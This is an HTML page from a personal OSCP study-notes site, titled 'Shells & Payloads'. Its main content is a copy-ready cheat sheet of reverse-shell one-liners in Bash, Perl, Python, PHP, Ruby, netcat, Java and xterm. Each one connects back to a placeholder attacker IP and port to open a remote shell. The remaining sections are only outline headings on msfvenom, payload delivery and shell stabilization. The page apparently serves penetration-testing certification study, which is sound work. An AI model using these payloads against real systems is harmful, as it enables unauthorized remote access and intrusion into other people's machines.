<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Shells & Payloads | OSCP Notes</title>

  <!-- evita flash blanco -->
  <meta name="color-scheme" content="dark">
  <style>
    html, body {
      margin: 0;
      background: #0b0c0d;
      color: #e8e8ea;
    }
  </style>

  <link rel="stylesheet" href="../css/style.css">
</head>

<body>
<div class="layout">

<!-- SIDEBAR -->
<aside class="sidebar">

  <!-- PERFIL -->
  <div class="profile">
    <img src="../img/logo.png" alt="Logo" class="profile-img">
    <h2>Genaro</h2>
    <p class="tag">XXXX XXXX</p>
  </div>

  <!-- REDES -->
  <div class="socials">
    <a href="https://youtube.com/@g3narin" target="_blank">
      <span class="icon">‚ñ∂</span>
      <span>YouTube</span>
      <span class="user">g3narin</span>
    </a>
    <a href="https://app.hackthebox.com/users/2426983" target="_blank">
      <span class="icon">‚¨¢</span>
      <span>HackTheBox</span>
      <span class="user">Genaro</span>
    </a>
  </div>

  <hr class="divider">

  <!-- NAV -->
  <nav class="nav">

    <a href="../index.html">üè† Home</a>

    <a href="enumeration.html">üîç Enumeration</a>
    <a href="web-attacks.html">üåê Web Attacks</a>

    <a href="shells.html" class="active">üêö Shells & Payloads</a>

    <a href="file-transfer.html">üìÅ File Transfer</a>
    <a href="passwords.html">üîë Password Attacks</a>

    <a href="linux-privesc.html">üêß Linux PrivEsc</a>
    <a href="windows-privesc.html">ü™ü Windows PrivEsc</a>

    <a href="pivoting.html">üîÄ Pivoting</a>
    <a href="ad-enumeration.html">üß© AD Enumeration</a>

  <a href="ad-attacks.html">‚öîÔ∏è AD Attacks I</a>
    <a href="ad-attacks2.html">‚öîÔ∏è AD Attacks II</a>

  <a href="ad-lateral-movement.html">üîÄ AD Lateral Movement</a>

  </nav>

</aside>

<!-- MAIN -->
<main class="main">

  <div class="topbar">
    <div class="topbar-inner">
      <input id="searchInput" placeholder="Search...">
      <button id="clearBtn">Clear</button>
    </div>
  </div>

  <div class="content">

    <!-- TITLE -->
    <div class="section">
      <h1>Shells & Payloads</h1>

    </div>


    <!-- ===================== -->
<!-- REVERSE SHELLS -->
<!-- ===================== -->
<div class="section">
  <h2>Reverse Shells</h2>

  <!-- BASH -->
  <p><strong>Bash</strong></p>
  <pre>
<code>bash -i >& /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>&1</code>
<button class="copy-btn" data-copy="bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1">COPY</button>
  </pre>
  

  <pre>
<code>bash -c 'bash -i >& /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>&1'</code>
<button
  class="copy-btn"
  data-copy="bash -c 'bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1'">COPY</button>
</pre>

<pre>
<code>bash -c 'bash -i >%26 /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>%261'</code>
<button
  class="copy-btn"
  data-copy="bash -c 'bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1'">COPY</button>
</pre>

  <!-- PERL -->
  <p><strong>Perl</strong></p>
  <pre>
<code>perl -e 'use Socket;$i="&lt;IP-ATTACKER&gt;";$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
<button class="copy-btn" data-copy="perl -e 'use Socket;$i=&quot;<IP-ATTACKER>&quot;;$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;>&amp;S&quot;);open(STDOUT,&quot;>&amp;S&quot;);open(STDERR,&quot;>&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'">COPY</button>
  </pre>

  <!-- PYTHON -->
  <p><strong>Python</strong></p>
  <pre>
<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'</code>
<button class="copy-btn" data-copy="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<IP-ATTACKER>&quot;,<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'">COPY</button>
  </pre>

  <pre class="code-block">
<code>import socket
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("&lt;IP-ATTACKER&gt;", &lt;PORT&gt;))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/bash")</code>
<button class="copy-btn" data-copy="import socket
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&lt;IP-ATTACKER&gt;, &lt;PORT&gt;))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn(&quot;/bin/bash&quot;)">COPY</button>
</pre>

  <!-- PHP -->
  <p><strong>PHP</strong></p>
  <pre>
<code>php -r '$sock=fsockopen("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
<button class="copy-btn" data-copy="php -r '$sock=fsockopen(&quot;<IP-ATTACKER>&quot;,<PORT>);exec(&quot;/bin/sh -i <&3 >&3 2>&3&quot;);'">COPY</button>
  </pre>

  <!-- RUBY -->
  <p><strong>Ruby</strong></p>
  <pre>
<code>ruby -rsocket -e 'f=TCPSocket.open("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code>
<button class="copy-btn" data-copy="ruby -rsocket -e 'f=TCPSocket.open(&quot;<IP-ATTACKER>&quot;,<PORT>).to_i;exec sprintf(&quot;/bin/sh -i <&%d >&%d 2>&%d&quot;,f,f,f)'">COPY</button>
  </pre>

  <!-- NETCAT -->
  <p><strong>Netcat (with -e)</strong></p>
  <pre>
<code>nc -e /bin/sh &lt;IP-ATTACKER&gt; &lt;PORT&gt;</code>
<button class="copy-btn" data-copy="nc -e /bin/sh <IP-ATTACKER> <PORT>">COPY</button>
  </pre>

  <p><strong>Netcat (no -e support)</strong></p>
  <pre>
<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;IP-ATTACKER&gt; &lt;PORT&gt; >/tmp/f</code>
<button class="copy-btn" data-copy="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP-ATTACKER> <PORT> >/tmp/f">COPY</button>
  </pre>

  <!-- JAVA -->
  <p><strong>Java</strong></p>
  <pre>
<code>Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt;;cat <&5 | while read line; do $line 2>&5 >&5; done"});</code>
<button class="copy-btn" data-copy="Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5<>/dev/tcp/<IP-ATTACKER>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done&quot;});">COPY</button>
  </pre>

  <!-- XTERM -->
  <p><strong>Xterm Reverse Shell</strong></p>
  <pre>
<code>xterm -display &lt;IP-ATTACKER&gt;:&lt;DISPLAY&gt;</code>
<button class="copy-btn" data-copy="xterm -display <IP-ATTACKER>:<DISPLAY>">COPY</button>
  </pre>

  <p><strong>Listener (Attacker)</strong></p>
  <pre>
<code>Xnest :&lt;DISPLAY&gt;</code>
<button class="copy-btn" data-copy="Xnest :<DISPLAY>">COPY</button>
  </pre>

  <pre>
<code>xhost +&lt;TARGET-IP&gt;</code>
<button class="copy-btn" data-copy="xhost +<TARGET-IP>">COPY</button>
  </pre>
</div>


    <div class="section">
      <h2>Shell Stabilization</h2>

    </div>

    <div class="section">
      <h2>Upgrading to Fully Interactive Shell</h2>
      <ul>
        <li>PTY spawning</li>
        <li>Environment variables</li>
        <li>Handling restricted shells</li>
      </ul>
    </div>

    <div class="section">
      <h2>Dealing with Limited Shells</h2>
      <ul>
        <li>No TTY</li>
        <li>No outbound traffic</li>
        <li>Limited binaries</li>
      </ul>
    </div>

    <!-- PAYLOADS -->
    <div class="section">
      <h2>Payload Concepts</h2>
      <ul>
        <li>Staged vs Non-Staged</li>
        <li>Reverse vs Bind</li>
        <li>Inline vs File-based</li>
      </ul>
    </div>

    <div class="section">
      <h2>Msfvenom Payload Generation</h2>
      <ul>
        <li>Linux payloads</li>
        <li>Windows payloads</li>
        <li>Web payloads</li>
        <li>Encoding and evasion</li>
      </ul>
    </div>

    <div class="section">
      <h2>Payload Delivery Methods</h2>
      <ul>
        <li>Web uploads</li>
        <li>Command injection</li>
        <li>File inclusion</li>
        <li>Scheduled execution</li>
      </ul>
    </div>

  </div>
</main>

</div>

<script src="../js/main.js"></script>
</body>
</html>
